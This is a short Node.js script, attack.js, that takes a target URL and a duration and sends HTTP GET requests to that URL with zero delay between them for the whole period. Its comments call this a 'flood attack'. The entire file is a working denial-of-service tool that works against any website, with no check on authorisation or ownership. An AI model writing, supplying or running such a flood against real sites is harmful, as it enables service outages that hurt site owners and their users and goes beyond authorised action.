const axios = require('axios');

// Get command line arguments: target URL and duration
const [,, targetUrl, timeInSeconds] = process.argv;

if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

// Convert timeInSeconds to a number and ensure it's valid
const durationInMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationInMs) || durationInMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

// Mark the start and stop time for the test
const startTime = Date.now();
const stopTime = startTime + durationInMs;

// Function to continuously send HTTP requests
const sendRequest = async () => {
  try {
    const response = await axios.get(targetUrl);
    console.log(`Request sent: Status ${response.status}`);
  } catch (error) {
    console.error(`Request failed: ${error.message}`);
  }
};

// Flood the target without delay for the given duration
const performFlood = () => {
  const interval = setInterval(() => {
    if (Date.now() > stopTime) {
      clearInterval(interval); // Stop after the time limit is reached
      console.log('Flood test completed.');
      return;
    }

    // Send requests continuously
    sendRequest();
  }, 0); // No delay, instant flood (this sends requests as fast as the system can handle)
};

// Start the flood attack
performFlood();
